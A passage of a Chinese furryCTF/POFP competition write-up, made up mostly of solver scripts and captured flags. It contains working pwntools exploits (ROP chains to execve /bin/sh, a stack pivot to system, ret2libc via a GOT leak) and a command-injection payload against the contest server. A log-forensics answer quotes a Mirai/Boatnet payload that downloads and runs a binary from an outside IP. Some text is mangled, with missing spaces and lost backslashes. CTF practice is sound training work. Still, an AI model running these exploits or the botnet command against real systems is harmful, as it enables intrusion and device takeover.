                elif len(stack) == 1:
                    b = 0      
                    a = stack.pop()
                    return a, b
                else:
                    return 0, 0 

            def pop_safe():
                return stack.pop() if stack else 0
            
            def peek_safe():
                return stack[-1] if stack else 0

            if op_type == 'PUSH':
                if ip < len(tokens):
                    val = int(tokens[ip])
                    ip += 1
                    stack.append(val)

            elif op_type == 'ADD':
                a, b = get_operands()
                stack.append(to_int32(a + b))

            elif op_type == 'SUB':
                a, b = get_operands()
                stack.append(to_int32(a - b))

            elif op_type == 'MUL':
                a, b = get_operands()
                stack.append(to_int32(a * b)) 
            
            elif op_type == 'DIV':
                a, b = get_operands()
                if b == 0: 
                    stack.append(0)
                else: 
                    stack.append(int(a / b)) 

            elif op_type == 'XOR':
                a, b = get_operands()
                stack.append(to_int32(a ^ b))

            elif op_type == 'SWAP':
                if len(stack) >= 2:
                    b = stack.pop()
                    a = stack.pop()
                    stack.append(b)
                    stack.append(a)

            elif op_type == 'DUP':
                val = peek_safe()
                stack.append(val)

            elif op_type == 'POP':
                pop_safe()

            elif op_type == 'EXIT':
                break
            
            else:
                pop_safe()

        
except Exception:
            return 0

    return stack[-1] if stack else 0

def solve():
    while True:
        try:
            r = remote(HOST, PORT)
            break
        
except:
            time.sleep(1)

    for i in range(1, 101):
        try:
            r.recvuntil(f'Level {i}/100:'.encode())
            r.recvline()
            bytecode = r.recvline().decode().strip()
            
            ans = run_vm(bytecode)
            print(f"[*] Level {i} Ans: {ans}")
            r.sendline(str(ans).encode())
            
            while True:
                try:
                    line = r.recvline(timeout=0.4).decode().strip()
                    if not line: break
                    
                    if"Level"in line:
                        r.unrecv((line + 'n').encode())
                        break
                        
                    if"POFP{"in line:
                        print(f"n[!] FLAG: {line}")
                        return
                        
                
except Exception:
                    break
                
        
except EOFError:
            break
            
    r.interactive()

if __name__ == '__main__':
    solve()
POFP{7ea6031a-5213-403c-8f39-e06d2b19c4e6}
import ast
import sys

sys.setrecursionlimit(10000)

def solve():
    print("[-] Reading Encrypt.py ...")
    try:
        with open('Encrypt.py', 'r', encoding='utf-8') as f:
            content = f.read()
    
except UnicodeDecodeError:
        with open('Encrypt.py', 'r', encoding='gbk') as f:
            content = f.read()
    
except FileNotFoundError:
        print("[!] File not found.")
        return

    matrix_str = ""
    result_str = ""
    
    lines = content.splitlines()
    for line in lines:
        if line.startswith("#matrix="):
            matrix_str = line.replace("#matrix=", "").strip()
        elif line.startswith("#result="):
            result_str = line.replace("#result=", "").strip()
            
    if not matrix_str or not result_str:
        print("[!] Data not found.")
        return

    print("[-] Parsing data...")
    try:
        matrix = ast.literal_eval(matrix_str)
        result = ast.literal_eval(result_str)
    
except Exception as e:
        print(f"[!] Parse error: {e}")
        return

    aug_matrix = []
    for r_idx, row_str in enumerate(matrix):
        row_val = int(row_str, 2)
        row_val = (row_val << 1) | result[r_idx]
        aug_matrix.append(row_val)

    num_vars = len(matrix[0])
    rows = aug_matrix
    pivot_row_idx = 0
    
    print("[-] Gaussian Elimination...")
    for bit_pos in range(num_vars, 0, -1):
        if pivot_row_idx >= len(rows): break
        mask = 1 << bit_pos
        
        found = -1
        for r in range(pivot_row_idx, len(rows)):
            if rows[r] & mask:
                found = r
                break
        
        if found == -1: continue
            
        rows[pivot_row_idx], rows[found] = rows[found], rows[pivot_row_idx]
        
        curr_row_val = rows[pivot_row_idx]
        for r in range(len(rows)):
            if r != pivot_row_idx:
                if rows[r] & mask:
                    rows[r] ^= curr_row_val
        pivot_row_idx += 1

    solution_bits = ['?'] * num_vars
    for row_val in rows:
        if row_val <= 1: continue
        l = row_val.bit_length()
        var_pos = l - 1
        res = row_val & 1
        idx = num_vars - var_pos
        if 0 <= idx < num_vars:
            solution_bits[idx] = str(res)

    binary_string = "".join(solution_bits)
    if'?'in binary_string:
        binary_string = binary_string.replace('?', '0')

    print("[-] Decoding...")
    candidates = decode_all_candidates(binary_string)
    
    if candidates:
        def count_digits(s):
            return sum(c.isdigit() for c in s)
        candidates.sort(key=count_digits)
        
        print(f"n[+] Flag: {candidates[0]}")
    else:
        print("n[!] Decode failed.")

def decode_all_candidates(bits):
    import string
    allowed_chars = string.ascii_letters + string.digits + "_{}"
    char_map = {}
    for c in allowed_chars:
        char_map[c] = bin(ord(c)).replace("0b", "")
        
    prefix = "furryCTF{"
    current_bits = ""
    for c in prefix:
        current_bits += char_map[c]
        
    if not bits.startswith(current_bits):
        return []
        
    remaining = bits[len(current_bits):]
    results = []
    find_paths(remaining, char_map, [], results)
    
    return [prefix + "".join(r) for r in results]

def find_paths(bits, char_map, current_path, results):
    if len(results) > 20: 
        return
    if not bits:
        return
    if bits == char_map['}']:
        results.append(current_path + ['}'])
        return

    for char, binary in char_map.items():
        if char == '}' or char == '{': continue
        if bits.startswith(binary):
            find_paths(bits[len(binary):], char_map, current_path + [char], results)

if __name__ == '__main__':
    solve()
furryCTF{Xa2_Matrc8_Wi7h_On9_Unis5e_SaYk41on}
mov rax, r14
mov rdx, r15
retn
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'critical'

binary_name = './nosystem'
elf = ELF(binary_name)
io = remote('ctf.furryctf.com', 32828)

bss_addr = elf.bss() + 0x100
scanf_plt = elf.plt['__isoc99_scanf']
syscall_addr = next(elf.search(b'x0fx05'))
fmt_str_addr = next(elf.search(b'%[^n]'))

csu_end_addr = 0x40134A
magic_gadget = 0x40116E
pop_rdi = 0x401353
pop_rsi = 0x401351

offset = 72
payload = b'A' * offset

payload += p64(pop_rdi) + p64(fmt_str_addr)
payload += p64(pop_rsi) + p64(bss_addr) + p64(0)
payload += p64(scanf_plt)

payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_rsi) + p64(0) + p64(0)

payload += p64(csu_end_addr)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(59)
payload += p64(0)

payload += p64(magic_gadget)
payload += p64(syscall_addr)

io.recvuntil(b"think so?n")
io.sendline(payload)

io.sendline(b'/bin/shx00')

io.interactive()
furryCTF{5bbac3076208_WElC0me_7o_pWn_574cK_Sy57eM_Nwn}
from pwn import *
import time

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'critical'

io = remote('ctf.furryctf.com', 32829)
elf = ELF('./p')

fake_stack = elf.bss() + 0x800
system_plt = elf.plt['system']
lea_eax_ebp_5c = next(elf.search(b'x8dx45xa4'))
leave_ret = next(elf.search(b'xc9xc3'))

io.recvuntil(b'5.Byen')
io.sendline(b'4')
io.recvuntil(b'preparations have you made?n')

payload1 = b'A' * 92
payload1 += p32(fake_stack + 0x5c)
payload1 += p32(lea_eax_ebp_5c)

io.send(payload1)

binsh_addr = fake_stack + 12
payload2 = flat([
    system_plt,
    0xdeadbeef,
    binsh_addr,
    b'/bin/shx00'
])
payload2 = payload2.ljust(92, b'x00')
payload2 += p32(fake_stack - 4)
payload2 += p32(leave_ret)
payload2 = payload2.ljust(104, b'x00')

time.sleep(0.2)
io.send(payload2)

time.sleep(0.5)
io.send(b'env >&2; exitn')

print(io.recvall().decode(errors='ignore'))
io.close()
POFP{892358e7-e400-44e7-8095-6d6e46c09523}
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  const char *v9; // rax
  size_t v10; // rbx
  const void *v11; // rsi
  char v12; // [rsp+3h] [rbp-20BDh] BYREF
  socklen_t addr_len; // [rsp+4h] [rbp-20BCh] BYREF
  int fd; // [rsp+8h] [rbp-20B8h]
  int v15; // [rsp+Ch] [rbp-20B4h]
  __int64 v16; // [rsp+10h] [rbp-20B0h]
  FILE *stream; // [rsp+18h] [rbp-20A8h]
  char *v18; // [rsp+20h] [rbp-20A0h]
  char *v19; // [rsp+28h] [rbp-2098h]
  struct sockaddr addr; // [rsp+30h] [rbp-2090h] BYREF
  _BYTE v21[32]; // [rsp+40h] [rbp-2080h] BYREF
  _BYTE v22[32]; // [rsp+60h] [rbp-2060h] BYREF
  _BYTE v23[32]; // [rsp+80h] [rbp-2040h] BYREF
  char s[24]; // [rsp+A0h] [rbp-2020h] BYREF
  char v25[24]; // [rsp+10A0h] [rbp-1020h] BYREF
  unsigned __int64 v26; // [rsp+20A8h] [rbp-18h]

  v26 = __readfsqword(0x28u);
  *(_QWORD *)&addr.sa_data[6] = 0;
  addr_len = 16;
  fd = socket(2, 1, 0);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x1F90u);
  bind(fd, &addr, 0x10u);
  listen(fd, 3);
  v3 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Vulnerable POST Web server running on port ");
  v4 = std::
ostream::
operator<<(v3, 8080);
  std::
operator<<<std::
char_traits<char>>(v4, "...n");
while ( 1 )
  {
    v15 = accept(fd, &addr, &addr_len);
    memset(s, 0, 0x1000u);
    read(v15, s, 0xFFFu);
    v5 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Request:n");
    v6 = std::
operator<<<std::
char_traits<char>>(v5, s);
    std::
ostream::
operator<<(v6, &std::
endl<char,std::
char_traits<char>>);
    v18 = &v12;
    std::
string::
basic_string<std::
allocator<char>>(
      v21,
      "HTTP/1.1 200 OKrnContent-Type: text/htmlrnConnection: closernrn",
      &v12);
    std::
__new_allocator<char>::~__new_allocator(&v12);
    v19 = &v12;
    std::
string::
basic_string<std::
allocator<char>>(v22, s, &v12);
    std::
__new_allocator<char>::~__new_allocator(&v12);
    if ( std::
string::
rfind(v22, "POST ", 0) )
    {
      if ( std::
string::
rfind(v22, "GET / ", 0) )
        std::
string::
operator+=(v21, "Not Foundn");
      else
        std::
string::
operator+=(
          v21,
          "<html><h1>Welcome to the furryctf competition.
We hope you will becom"
          "e a master of webpwn.</h1></html>n");
    }
    else
    {
      v16 = std::
string::
find(v22, "rnrn", 0);
      if ( v16 != -1 )
      {
        std::
string::
substr(v23, v22, v16 + 4, -1);
        v7 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Executing command: ");
        v8 = std::
operator<<<char>(v7, v23);
        std::
ostream::
operator<<(v8, &std::
endl<char,std::
char_traits<char>>);
        v9 = (const char *)std::
string::
c_str(v23);
        stream = popen(v9, "r");
        if ( stream )
        {
          while ( fgets(v25, 4096, stream) )
            std::
string::
operator+=(v21, v25);
          pclose(stream);
        }
        std::
string::~string(v23);
      }
    }
    v10 = std::
string::
size(v21);
    v11 = (const void *)std::
string::
c_str(v21);
    write(v15, v11, v10);
    close(v15);
    std::
string::~string(v22);
    std::
string::~string(v21);
  }
}
from pwn import *

HOST = 'ctf.furryctf.com'
PORT = 32830

def exploit():
    try:
        io = remote(HOST, PORT)

        command = b"cat /flag"

        payload = b"POST / HTTP/1.1rn"
        payload += b"Host: pwnrn"
        payload += b"rn"
        payload += command

        print(f"[*] Sending payload: {payload}")

        io.send(payload)

        response = io.recvall(timeout=5)

        print("n[+] Response from server:")
        print(response.decode(errors='ignore'))

        io.close()

    
except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    exploit()
POFP{b1c31c33-eb7c-4947-aca3-8ec6087e6758}
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

binary_file = './ret2vdso_x32'
elf = ELF(binary_file)
io = remote('ctf.furryctf.com', 32831)

offset = 272

io.recvuntil(b'> ')

payload1 = flat([
    b'A' * offset,
    elf.plt['write'],
    elf.sym['main'],
    1,
    elf.got['write'],
    4
])

io.sendline(payload1)

write_addr = u32(io.recv(4))
print(f"Leaked write address: {hex(write_addr)}")

OFFSET_WRITE = 0x117b60
OFFSET_SYSTEM = 0x50430
OFFSET_BINSH = 0x1c4de8

libc_base = write_addr - OFFSET_WRITE
system_addr = libc_base + OFFSET_SYSTEM
binsh_addr = libc_base + OFFSET_BINSH

print(f"Libc Base: {hex(libc_base)}")
print(f"System: {hex(system_addr)}")
print(f"Binsh: {hex(binsh_addr)}")

io.recvuntil(b'> ')

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload2 = flat([
    b'A' * offset,
    ret_gadget,
    system_addr,
    0xdeadbeef,
    binsh_addr
])

io.sendline(payload2)
io.sendline(b'cat flag')
io.interactive()
POFP{ef038613-5328-4598-a2b1-85c364de24e1}
POST / HTTP/1.1
Host: 192.168.136.1
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Content-Length: 88
Connection: close
Content-Type: application/x-www-form-urlencoded

<methodCall><methodName>system.listMethods</methodName></methodCall>HTTP/1.0 200 HTTP OK
Server: Wing FTP Server(Free Edition)
Cache-Control: no-store
Content-Type: text/html
Content-Length: 8209
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Connection: close

<html>
<head>
<title>Wing FTP Server - Web Client</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="no-cache, must-revalidate" />
<meta http-equiv="Expires" content="0" />
<link rel="Shortcut Icon" href="images/logo.ico" type="image/x-icon">
<link rel="stylesheet" href="css/bulma.min.css" type="text/css">
<link rel="stylesheet" href="css/allfonts.min.css" type="text/css">


<!--[if lt IE 9]>
  
<![endif]-->

<script language="javascript">

if(!navigator.cookieEnabled)
{
 alert("Cookies must be enabled on your browser!");
}

function $(obj)
{
returndocument.getElementById(obj);
}

function ch()
{
if ($("username_val").value=="")
 {
  alert("Please enter your account name!");
  $("username_val").focus();
returnfalse;
 }
 $("username").value = $("username_val").value.replace(/+/g,"t");
 $("password").value = $("password_val").value.replace(/+/g,"t");
returntrue;
}

function setCookie(name,value,date) 
{
document.cookie = name + "=" + escape(value) + "; expires=" + date.toGMTString() + "; path=/;";
}

function getCookie(name) 
{
var search; 
 search = name + "="
 offset = document.cookie.indexOf(search) 
if (offset != -1) 
 { 
  offset += search.length ; 
  end = document.cookie.indexOf(";", offset) ; 
if (end == -1) 
  end = document.cookie.length; 
returnunescape(document.cookie.substring(offset, end)); 
 } 
else
 {
return""; 
 }
}

function deleteCookie(name) 
{
var expdate = newDate(); 
 expdate.setTime(expdate.getTime() - (86400*1000)); 
 setCookie(name, "", expdate); 
}

var langindexArr = newArray("english","french","german","italian","dutch","portuguese","spanish","schinese","tchinese","japanese","czech","romanian","turkish","korean","polish");
var langArr = newArray("English","French","German","Italian","Dutch","Portuguese","Spanish","Simplified Chinese","Traditional Chinese","Japanese","Czech","Romanian","Turkish","Korean","Polish");

if(navigator.cookieEnabled)
{
if(getCookie("client_lang") == "" && location.search.indexOf("?lang") == -1)
 {
var language = null;
if (navigator.appName == 'Netscape')
   language = navigator.language;
else
   language = navigator.browserLanguage;

if (language.indexOf('en') > -1) location = 'login.html?lang=english';
elseif (language.indexOf('fr') > -1) location = 'login.html?lang=french';
elseif (language.indexOf('de') > -1) location = 'login.html?lang=german';
elseif (language.indexOf('it') > -1) location = 'login.html?lang=italian';
elseif (language.indexOf('nl') > -1) location = 'login.html?lang=dutch';
elseif (language.indexOf('pt') > -1) location = 'login.html?lang=portuguese';
elseif (language.indexOf('es') > -1) location = 'login.html?lang=spanish';
elseif (language.indexOf('zh-TW') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh-HK') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh-MO') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh') > -1) location = 'login.html?lang=schinese';
elseif (language.indexOf('ja') > -1) location = 'login.html?lang=japanese';
elseif (language.indexOf('cz') > -1) location = 'login.html?lang=czech';
elseif (language.indexOf('ro') > -1) location = 'login.html?lang=romanian';
elseif (language.indexOf('tr') > -1) location = 'login.html?lang=turkish';
elseif (language.indexOf('ko') > -1) location = 'login.html?lang=korean';
elseif (language.indexOf('pl') > -1) location = 'login.html?lang=polish';
else location = 'login.html?lang=english';
 }
else
 {
  langArr = newArray("English","Fran..ais","Deutsch","Italiano","Nederlands","Portugu..s","Espa..ol","............","............",".........","Czech","Romanian","T..rk..e",".........","Polski");
 }
}

function changelanguage(obj)
{
var l = obj.options[obj.selectedIndex].value;
 location = 'login.html?lang='+l;
}

function switchcheckbox()
{
if($("remember").checked == false)
 {
  deleteCookie("client_login_name");
 }
}

function showQRcode()
{
if($("qrcode").style.display == "none" || $("qrcode").style.display == "")
  $("qrcode").style.display = "block";
else
  $("qrcode").style.display = "none";
}
</script>

</head>




<form class="box" method="post" action="loginok.html">




Web Client




    
    
   
      
    




    
    
   
      
    






    <select id="lang_sel" onchange="changelanguage(this)">
    </select>


    
    






Remember me


Download App
[](https://wftpserver.com/download_client.html)








 Login 



</form>



   FTP server software powered by [Wing FTP Server v7.4.4](https://www.wftpserver.com/)





</html>

<script language="javascript">
if(navigator.cookieEnabled)
{
for(var index in langArr)
 {
  $("lang_sel").options.add(new Option(langArr[index],langindexArr[index]));
if(getCookie("client_lang") == langindexArr[index])
   $("lang_sel").options[index].selected = true;
 }
}

$("username_val").focus();

</script>

<noscript><H2>The web client requires that you have Javascript enabled on your browser.
If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></noscript>
ZnVycnlDVEZ7RnIwbV9Bbm9uOW0wdXNfVG9fUm8wdH0=
furryCTF{Fr0m_Anon9m0us_To_Ro0t}
POFP{0xFF7C350e70879D04A13bb2d8D77B60e603b7DB72}
1. 真正的攻击者与漏洞 
攻击特征: 针对 TBK DVR (数字视频录像机) 设备的远程命令执行 (RCE) 漏洞。

关键日志:

Plaintext
144.172.98.50 - - [24/Sep/2025:23:24:12 +0800] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.165%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1"201166"-""Mozilla/5.0"
状态码: 201 (关键证据！表示请求成功，文件/资源被创建)。

CVE 编号: CVE-2024-3721 (或者关联的旧编号 CVE-2018-9995，但 opt=sys&cmd=... 的利用方式更符合 2024 年披露的特征)。

攻击者 IP: 144.172.98.50

攻击载荷 (Payload): cd /tmp;rm boatnet.arm7; wget http://103.77.241.165/hiddenbin/boatnet.arm7; chmod 777 *; ./boatnet.arm7 tbk 这是典型的 Mirai / Boatnet 僵尸网络植入行为。
furryCTF{CVE-2024-3721}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769529-wxsync-2026-02-3c4c054b8106a6148a52572883543470.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769531-wxsync-2026-02-31657ef7123a748c19714ca38a7bd66b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769532-wxsync-2026-02-0adddb7aef3cc0d0fd612e18bdba642d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769534-wxsync-2026-02-bba355499382cde75cd17dcb85a67908.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769535-wxsync-2026-02-6478a2bdc748ae5ef36b520bfeb7083a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769537-wxsync-2026-02-26db68de5af922bf703c523f249f349a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769539-wxsync-2026-02-d5d8d507f0b10479be338580d4285248.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769540-wxsync-2026-02-42c731a94c4b0171dc31e3b4dddfd99e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769542-wxsync-2026-02-ac135e0f7da496fa913667706c35873b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1770769544-wxsync-2026-02-675ad06320ddabe0cceefcdca640c5af.png)